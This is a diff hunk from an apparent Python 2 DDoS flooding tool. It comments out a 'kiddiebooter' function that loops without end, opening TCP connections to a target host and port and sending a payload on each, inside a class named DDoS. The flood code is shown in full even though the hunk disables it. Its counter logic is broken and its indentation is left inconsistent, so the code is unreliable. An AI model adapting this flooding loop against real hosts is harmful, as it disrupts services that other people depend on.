@@ -288,19 +288,19 @@ class DDoS(object):
 		sock.close()
 		for proto in _files:
 			_files[proto][FILE_HANDLE].close()
-def kiddiebooter(host,port): # Experimental dont use yet 
-	totalsent=0
-	print 'Starting....'
-	while 1:
-		if totalsent < 64:
-			print '64 Packets have been sent'
-			totalsent=0
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		connect=s.connect((host,port))
-		s.settimeout(4500) # Change me
+#def kiddiebooter(host,port): # Experimental dont use yet 
+	#totalsent=0
+	#print 'Starting....'
+	#while 1:
+		#if totalsent < 64:
+		#	print '64 Packets have been sent'
+		#	totalsent=0
+		#s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		#connect=s.connect((host,port))
+		#s.settimeout(4500) # Change me
 		#setsockopt(SOL_SOCKET., SO_SNDBUF, 5)
-		s.send(PAYLOAD[MC])
-		totalsent=totalsent+1
+		#s.send(PAYLOAD[MC])
+		#totalsent=totalsent+1
 		
 def main():
 	parser = OptionParser(usage=USAGE)
